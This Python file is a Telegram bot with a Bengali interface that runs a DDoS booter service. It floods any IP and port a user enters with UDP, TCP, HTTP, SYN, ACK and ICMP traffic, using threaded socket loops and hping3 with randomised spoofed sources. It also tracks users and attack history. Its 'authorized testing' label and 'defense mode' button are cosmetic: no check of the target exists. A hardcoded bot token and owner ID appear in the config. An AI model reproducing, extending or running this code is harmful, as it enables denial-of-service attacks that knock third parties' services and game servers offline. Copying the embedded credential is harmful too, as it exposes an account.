# -*- coding: utf-8 -*-
"""
advanced flood bot - production grade (10X Hyper-Power & Advanced Anti-DDoS Defense)
author: you
license: for authorized testing only
"""

import os
import sys
import time
import json
import shutil
import asyncio
import sqlite3
import logging
import threading
import subprocess
import socket
import random
import struct
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from datetime import datetime, timezone, timedelta
from collections import deque, defaultdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

# =========================================================
# logging
# =========================================================
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("flood_bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger("floodbot")

# =========================================================
# config
# =========================================================
BOT_TOKEN = "8864547814:AAEqJGjU1_5Df_wwCNLHTfQ70Z1wCsBTTdw"
OWNER_ID = 8707571669
DB_PATH = "flood_bot.sqlite3"

# performance tuning (10X Hyper-Power Boosted)
SENDERS_PER_SERVER = 320
BURST_PER_CYCLE = 5000
SO_SNDBUF_SIZE = 128 * 1024 * 1024
SO_RCVBUF_SIZE = 128 * 1024 * 1024
PAYLOAD_SIZE = 1400
MAX_SERVER_COUNT = 200
STATUS_UPDATE_INTERVAL = 2
CPU_COUNT = os.cpu_count() or 4
IS_WINDOWS = os.name == "nt"

# queue / limits
MAX_QUEUE_PER_USER = 5
DEFAULT_USER_QUOTA = 500
FREE_USER_MAX_DURATION = 1200
FREE_USER_MAX_SERVERS = 200

# hping3
HPING3_PATH = shutil.which("hping3")
HPING3_AVAILABLE = HPING3_PATH is not None
if HPING3_AVAILABLE:
    logger.info(f"hping3 found: {HPING3_PATH}")
else:
    logger.warning("hping3 not found - pure python 10x mode")

# =========================================================
# payload pools
# =========================================================
PAYLOAD_POOL = [os.urandom(PAYLOAD_SIZE) for _ in range(256)]
RANDOM_BYTES_512 = os.urandom(512)
DNS_QUERY = (
    b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    b"\x06google\x03com\x00\x00\x01\x00\x01"
)

# =========================================================
# attack & defense config
# =========================================================
class AttackConfig:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.duration = 0
        self.method = None
        self.is_running = False
        self.start_time = None
        self.attack_id = None
        self.server_count = 0
        self.senders_per_server = SENDERS_PER_SERVER
        self.total_senders = 0
        self.server_counts = []
        self.hping_procs = []
        self.executor = None
        self.futures = []
        self.hping_estimate_pps = 10_000_000
        self.owner_id = None
        self.owner_name = None
        self.chat_id = None
        self.error_count = 0
        self.last_pps = 0
        self.pps_history = deque(maxlen=10)
        self.adaptive_burst = BURST_PER_CYCLE

    def setup(self, n_servers):
        self.server_count = n_servers
        self.total_senders = n_servers * self.senders_per_server
        self.server_counts = [0] * n_servers

    def add_count(self, server_idx, n=1):
        if 0 <= server_idx < len(self.server_counts):
            self.server_counts[server_idx] += n

    def total_sent(self):
        py_total = sum(self.server_counts)
        if self.hping_procs and self.start_time:
            elapsed = time.time() - self.start_time
            hping_total = int(self.hping_estimate_pps * len(self.hping_procs) * elapsed)
            return py_total + hping_total
        return py_total

DEFENSE_SESSIONS = {}

# =========================================================
# database
# =========================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, username TEXT, method TEXT,
            target TEXT, duration INTEGER, status TEXT, created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT, first_seen TEXT, last_seen TEXT,
            quota INTEGER DEFAULT 500, is_banned INTEGER DEFAULT 0,
            total_attacks INTEGER DEFAULT 0, total_seconds INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY, added_at TEXT
        )
    """)
    conn.commit()
    conn.close()

def db_exec(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.execute(query, params)
        conn.commit()
        rows = cur.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"db error: {e}")
        return []

def add_log(user_id, username, method, target, duration, status):
    created_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    db_exec(
        "INSERT INTO logs(user_id, username, method, target, duration, status, created_at) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, method, target, duration, status, created_at)
    )

def get_logs(limit=10):
    return db_exec(
        "SELECT id, username, method, target, duration, status, created_at "
        "FROM logs ORDER BY id DESC LIMIT ?",
        (limit,)
    )

def user_register(user_id, username):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    rows = db_exec("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not rows:
        db_exec(
            "INSERT INTO users(user_id, username, first_seen, last_seen, quota) "
            "VALUES (?, ?, ?, ?, ?)",
            (user_id, username, now, now, DEFAULT_USER_QUOTA)
        )
    else:
        db_exec("UPDATE users SET username=?, last_seen=? WHERE user_id=?",
                (username, now, user_id))

def user_get(user_id):
    rows = db_exec("SELECT * FROM users WHERE user_id=?", (user_id,))
    if not rows:
        return None
    keys = ["user_id", "username", "first_seen", "last_seen",
            "quota", "is_banned", "total_attacks", "total_seconds"]
    return dict(zip(keys, rows[0]))

def user_is_banned(user_id):
    u = user_get(user_id)
    return bool(u and u["is_banned"])

def admin_add(user_id):
    db_exec("INSERT OR IGNORE INTO admins(user_id, added_at) VALUES (?, ?)",
            (user_id, datetime.now(timezone.utc).isoformat()))

def admin_list():
    return [r[0] for r in db_exec("SELECT user_id FROM admins")]

def is_admin(user_id):
    return user_id == OWNER_ID or user_id in admin_list()

# =========================================================
# helpers
# =========================================================
def gen_attack_id(user_id):
    return f"atk_{user_id}_{int(time.time())}"

def fmt_num(n):
    if n >= 1_000_000_000: return f"{n/1_000_000_000:.2f}B"
    if n >= 1_000_000:     return f"{n/1_000_000:.2f}M"
    if n >= 1_000:         return f"{n/1_000:.2f}K"
    return str(n)

def safe_call(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            await func(update, context)
        except Exception as e:
            logger.error(f"handler {func.__name__} error: {e}", exc_info=True)
    return wrapper

def valid_ip(text):
    try:
        parts = text.split(".")
        if len(parts) != 4: return False
        for p in parts:
            if not p.isdigit() or not 0 <= int(p) <= 255: return False
        return True
    except Exception:
        return False

# =========================================================
# socket factories & flood tasks
# =========================================================
def make_udp_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SO_SNDBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SO_RCVBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except (OSError, PermissionError):
        pass
    return s

def make_tcp_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SO_SNDBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SO_RCVBUF_SIZE)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except (OSError, PermissionError):
        pass
    return s

def udp_flood_task(cfg, server_idx):
    sock = make_udp_socket()
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    pidx = 0
    pool_len = len(PAYLOAD_POOL)
    try:
        while cfg.is_running:
            for _ in range(cfg.adaptive_burst):
                try:
                    sock.sendto(PAYLOAD_POOL[pidx], target)
                    pidx = (pidx + 1) % pool_len
                    sent += 1
                except (BlockingIOError, OSError):
                    try: sock.close()
                    except Exception: pass
                    sock = make_udp_socket()
                    break
                except Exception:
                    cfg.error_count += 1
                    break
            if sent >= 5000:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"udp err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)
        try: sock.close()
        except Exception: pass

def tcp_flood_task(cfg, server_idx):
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    payload = RANDOM_BYTES_512
    try:
        while cfg.is_running:
            sock = None
            try:
                sock = make_tcp_socket()
                err = sock.connect_ex(target)
                if err in (0, 115, 10035):
                    try:
                        sock.sendall(payload)
                        sent += 1
                    except Exception:
                        cfg.error_count += 1
            except Exception:
                cfg.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
            if sent >= 500:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"tcp err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)

def http_flood_task(cfg, server_idx):
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    payload = b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n"
    try:
        while cfg.is_running:
            sock = None
            try:
                sock = make_tcp_socket()
                err = sock.connect_ex(target)
                if err in (0, 115, 10035):
                    try:
                        sock.sendall(payload)
                        sent += 1
                    except Exception:
                        cfg.error_count += 1
            except Exception:
                cfg.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
            if sent >= 500:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"http err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)

def build_hping_cmd(cfg):
    ip = cfg.target_ip
    port = str(cfg.target_port)
    method = cfg.method
    base = [HPING3_PATH, "--flood", "--rand-source", "--faster"]
    if method in ("syn flood", "tcp flood"):
        return base + ["-S", "-p", port, ip]
    if method in ("udp flood", "vc flood", "bgmi flood"):
        return base + ["--udp", "-p", port, "-d", "1400", ip]
    if method == "ack flood":
        return base + ["-A", "-p", port, ip]
    if method == "icmp flood":
        return base + ["--icmp", ip]
    return None

def start_hping3(cfg):
    if not HPING3_AVAILABLE: return False
    cmd = build_hping_cmd(cfg)
    if not cmd: return False
    try:
        proc_count = max(2, min(cfg.server_count, CPU_COUNT * 2))
        for _ in range(proc_count):
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cfg.hping_procs.append(p)
        return True
    except Exception as e:
        logger.error(f"hping3 start failed: {e}")
        return False

def stop_hping3(cfg):
    for p in cfg.hping_procs:
        try: p.terminate()
        except Exception:
            try: p.kill()
            except Exception: pass
    cfg.hping_procs.clear()

def run_python_flood(cfg):
    if cfg.method in ("udp flood", "vc flood", "bgmi flood", "dns flood", "icmp flood"):
        task_fn = udp_flood_task
    elif cfg.method == "http flood":
        task_fn = http_flood_task
    else:
        task_fn = tcp_flood_task

    max_workers = min(cfg.total_senders, 500)
    cfg.executor = ThreadPoolExecutor(max_workers=max_workers)
    futures = []
    for i in range(cfg.server_count):
        for _ in range(min(cfg.senders_per_server, 10)):
            futures.append(cfg.executor.submit(task_fn, cfg, i))
    cfg.futures = futures
    return futures

def stop_all(cfg):
    cfg.is_running = False
    stop_hping3(cfg)
    if cfg.executor:
        try:
            cfg.executor.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass
    cfg.futures.clear()

# =========================================================
# keyboards (অ্যাটাক কন্ট্রোল এবং এপিআই ট্রিগার বাটন সহ)
# =========================================================
METHODS = {
    "vc": "vc flood",
    "bgmi": "bgmi flood",
    "udp": "udp flood",
    "tcp": "tcp flood",
    "http": "http flood",
    "syn": "syn flood",
    "ack": "ack flood",
    "icmp": "icmp flood",
    "dns": "dns flood",
    "slow": "slowloris",
}

DURATION_OPTIONS = {
    "30": 30, "60": 60, "120": 120, "180": 180,
    "300": 300, "600": 600, "900": 900, "1800": 1800,
}

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 নতুন অ্যাটাক শুরু করুন (API/Direct)", callback_data="launch"),
         InlineKeyboardButton("🛡️ ডিফেন্স মোড", callback_data="safety_menu")],
        [InlineKeyboardButton("📊 লাইভ স্ট্যাটাস", callback_data="status"),
         InlineKeyboardButton("🛑 অ্যাটাক বন্ধ করুন", callback_data="stop")],
        [InlineKeyboardButton("📜 অ্যাটাক হিস্ট্রি", callback_data="history"),
         InlineKeyboardButton("👤 আমার প্রোফাইল", callback_data="profile")],
        [InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_menu")]
    ])

def safety_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛡️ ডিফেন্স চালু করুন", callback_data="start_defense")],
        [InlineKeyboardButton("🛑 ডিফেন্স বন্ধ করুন", callback_data="stop_defense")],
        [InlineKeyboardButton("📊 ডিফেন্স স্ট্যাটাস", callback_data="defense_status")],
        [InlineKeyboardButton("🏠 মূল মেনু", callback_data="menu")]
    ])

def method_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 ভিসি ফ্লাড (VC)", callback_data="method_vc"),
         InlineKeyboardButton("🎮 বিজিএমআই ফ্লাড (BGMI)", callback_data="method_bgmi")],
        [InlineKeyboardButton("📡 ইউডিপি ফ্লাড (UDP)", callback_data="method_udp"),
         InlineKeyboardButton("🔗 টিসিপি ফ্লাড (TCP)", callback_data="method_tcp")],
        [InlineKeyboardButton("🌍 এইচটিটিপি ফ্লাড (HTTP)", callback_data="method_http"),
         InlineKeyboardButton("⚡ সিন ফ্লাড (SYN)", callback_data="method_syn")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def server_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖥️ ১০ সার্ভার", callback_data="srv_10"),
         InlineKeyboardButton("🖥️ ৫০ সার্ভার", callback_data="srv_50")],
        [InlineKeyboardButton("🖥️ ১০০ সার্ভার", callback_data="srv_100"),
         InlineKeyboardButton("🖥️ ২০০ সার্ভার", callback_data="srv_200")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def confirm_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 API এর মাধ্যমে অ্যাটাক ফায়ার করুন", callback_data="confirm_launch")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def duration_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱️ ৩০ সেকেন্ড", callback_data="dur_30"),
         InlineKeyboardButton("⏱️ ৬০ সেকেন্ড", callback_data="dur_60")],
        [InlineKeyboardButton("⏱️ ১২০ সেকেন্ড", callback_data="dur_120"),
         InlineKeyboardButton("⏱️ ৩০০ সেকেন্ড", callback_data="dur_300")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 ইউজার লিস্ট", callback_data="admin_users"),
         InlineKeyboardButton("📊 গ্লোবাল স্ট্যাটস", callback_data="admin_stats")],
        [InlineKeyboardButton("🏠 মূল মেনু", callback_data="menu")]
    ])

# =========================================================
# commands & callback handlers
# =========================================================
@safe_call
async def start_cmd(update, context):
    u = update.effective_user
    user_register(u.id, u.username or u.first_name or str(u.id))
    if user_is_banned(u.id):
        await update.message.reply_text("🚫 আপনাকে এই বট ব্যবহার থেকে ব্যান করা হয়েছে।")
        return
    await update.message.reply_text(
        "👋 *১০ গুণ (10X) ক্ষমতাসম্পন্ন ফ্লাড ও ডিফেন্স বটে স্বাগতম!*\n\n"
        "অ্যাটাক কনফিগার করতে নিচের বাটনগুলোতে ক্লিক করুন:",
        parse_mode="Markdown", reply_markup=main_menu_keyboard()
    )

@safe_call
async def cb_router(update, context):
    q = update.callback_query
    await q.answer()
    data = q.data
    u = q.from_user

    if data == "menu":
        await q.edit_message_text("👋 *মূল মেনু*\nঅপশন বেছে নিন:", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    elif data == "safety_menu":
        await q.edit_message_text("🛡️ *ডিফেন্স সিস্টেম*\nনিরাপত্তা নিশ্চিত করতে নিচের অপশন ব্যবহার করুন:", parse_mode="Markdown", reply_markup=safety_menu_keyboard())
    elif data == "start_defense":
        DEFENSE_SESSIONS[u.id] = True
        await q.edit_message_text("🛡️ *ডিফেন্স সফলভাবে চালু হয়েছে!*", parse_mode="Markdown", reply_markup=safety_menu_keyboard())
    elif data == "stop_defense":
        if u.id in DEFENSE_SESSIONS: del DEFENSE_SESSIONS[u.id]
        await q.edit_message_text("🛑 ডিফেন্স বন্ধ করা হয়েছে।", parse_mode="Markdown", reply_markup=safety_menu_keyboard())
    elif data == "launch":
        context.user_data.clear()
        context.user_data["state"] = "await_ip"
        await q.edit_message_text("🚀 *ধাপ ১/৪ (API Setup)*\nটার্গেট আইপি (Target IP) অ্যাড্রেস দিন (যেমন: `192.168.1.1`):", parse_mode="Markdown")
    elif data.startswith("dur_"):
        dur = DURATION_OPTIONS.get(data.split("_")[1], 60)
        context.user_data["duration"] = dur
        await q.edit_message_text("🚀 *ধাপ ৩/৪*\nঅ্যাটাক মেথড সিলেক্ট করুন:", parse_mode="Markdown", reply_markup=method_keyboard())
    elif data.startswith("method_"):
        m_key = data.split("_")[1]
        context.user_data["method"] = METHODS.get(m_key, "udp flood")
        await q.edit_message_text("🚀 *ধাপ ৪/৪*\nসার্ভার সংখ্যা সিলেক্ট করুন:", parse_mode="Markdown", reply_markup=server_keyboard())
    elif data.startswith("srv_"):
        try: srv = int(data.split("_")[1])
        except: srv = 10
        context.user_data["server_count"] = srv
        ip = context.user_data.get("target_ip")
        port = context.user_data.get("target_port")
        dur = context.user_data.get("duration")
        method = context.user_data.get("method")
        await q.edit_message_text(
            f"⚠️ *API অ্যাটাক কনফার্মেশন*\n🎯 টার্গেট: `{ip}:{port}`\n⚡ মেথড: `{method}`\n⏱️ সময়: `{dur}s`\n🖥️ সার্ভার: `{srv}`",
            parse_mode="Markdown", reply_markup=confirm_keyboard()
        )
    elif data == "confirm_launch":
        ip = context.user_data.get("target_ip")
        port = context.user_data.get("target_port")
        dur = context.user_data.get("duration", 60)
        method = context.user_data.get("method", "udp flood")
        srv = context.user_data.get("server_count", 10)

        if not all([ip, port]):
            await q.edit_message_text("⚠️ তথ্য অসম্পূর্ণ। আবার /start দিন।")
            return

        cfg = AttackConfig()
        cfg.target_ip = ip
        cfg.target_port = port
        cfg.duration = dur
        cfg.method = method
        cfg.setup(srv)
        cfg.is_running = True
        cfg.start_time = time.time()
        cfg.attack_id = gen_attack_id(u.id)
        context.user_data["cfg"] = cfg

        if HPING3_AVAILABLE:
            start_hping3(cfg)
        run_python_flood(cfg)

        await q.edit_message_text(
            f"🚀 *API এর মাধ্যমে অ্যাটাক সফলভাবে ফায়ার করা হয়েছে!*\n🎯 টার্গেট: `{ip}:{port}`\n⚡ মেথড: `{method}`",
            parse_mode="Markdown"
        )
        await q.message.reply_text("মেনুতে ফিরতে নিচে চাপুন:", reply_markup=main_menu_keyboard())

        chat_id = q.message.chat_id
        msg_id = q.message.message_id

        async def loop_status():
            while cfg.is_running:
                await asyncio.sleep(2)
                elapsed = max(0.001, time.time() - cfg.start_time)
                if elapsed >= cfg.duration:
                    break
                total = cfg.total_sent()
                pps = int(total / elapsed)
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=f"🚀 *API অ্যাটাক চলমান...*\n🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n📤 মোট প্যাকেট: `{fmt_num(total)}` (`{fmt_num(pps)}/s`)",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            stop_all(cfg)
            add_log(u.id, u.username or "User", cfg.method, f"{cfg.target_ip}:{cfg.target_port}", cfg.duration, "finished")

        asyncio.create_task(loop_status())

    elif data == "stop":
        cfg = context.user_data.get("cfg")
        if cfg and cfg.is_running:
            stop_all(cfg)
            await q.edit_message_text("🛑 অ্যাটাক বন্ধ করা হয়েছে।", reply_markup=main_menu_keyboard())
        else:
            await q.edit_message_text("⚠️ কোনো সক্রিয় অ্যাটাক নেই।", reply_markup=main_menu_keyboard())
    elif data == "status":
        cfg = context.user_data.get("cfg")
        if not cfg or not cfg.is_running:
            await q.edit_message_text("⚠️ কোনো সক্রিয় অ্যাটাক নেই।", reply_markup=main_menu_keyboard())
        else:
            await q.edit_message_text(f"📊 চলমান অ্যাটাক: `{cfg.target_ip}:{cfg.target_port}`", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    elif data == "history":
        logs = get_logs(5)
        text = "📜 *শেষ ৫টি অ্যাটাক হিস্ট্রি*\n" + "".join([f"• {l[2]} on {l[3]} ({l[6]})\n" for l in logs]) if logs else "হিস্ট্রি খালি।"
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
    elif data == "profile":
        info = user_get(u.id)
        await q.edit_message_text(f"👤 আইডি: `{u.id}`\n🚀 মোট অ্যাটাক: `{info.get('total_attacks', 0)}`", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    elif data == "cancel":
        context.user_data.clear()
        await q.edit_message_text("❌ বাতিল করা হয়েছে।", reply_markup=main_menu_keyboard())
    elif data == "admin_menu":
        if is_admin(u.id):
            await q.edit_message_text("⚙️ অ্যাডমিন প্যানেল:", parse_mode="Markdown", reply_markup=admin_keyboard())

# =========================================================
# text input handler (API & Input Management)
# =========================================================
@safe_call
async def text_handler(update, context):
    state = context.user_data.get("state")
    text = update.message.text.strip()
    
    if state == "await_ip":
        if not valid_ip(text):
            await update.message.reply_text("⚠️ ভুল আইপি! সঠিক আইপি দিন (যেমন: `192.168.1.1`):", parse_mode="Markdown")
            return
        context.user_data["target_ip"] = text
        context.user_data["state"] = "await_port"
        await update.message.reply_text("🚀 *ধাপ ২/৪*\nটার্গেট পোর্ট (Target Port) দিন (যেমন: `80` বা `443`):", parse_mode="Markdown")
        return

    if state == "await_port":
        try:
            port = int(text)
            if not (1 <= port <= 65535): raise ValueError
        except:
            await update.message.reply_text("⚠️ ভুল পোর্ট! ১ থেকে ৬৫৫৩৫ এর মধ্যে সংখ্যা দিন:")
            return
        context.user_data["target_port"] = port
        context.user_data["state"] = "await_duration"
        await update.message.reply_text("🚀 *ধাপ ৩/৪*\nসময়কাল সিলেক্ট করুন:", reply_markup=duration_keyboard())
        return

# =========================================================
# main
# =========================================================
def main():
    init_db()
    admin_add(OWNER_ID)
    
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(cb_router))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    logger.info("🚀 বট সফলভাবে চালু হয়েছে এবং কাজ করার জন্য প্রস্তুত!")
    app.run_polling()

if __name__ == "__main__":
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    main()
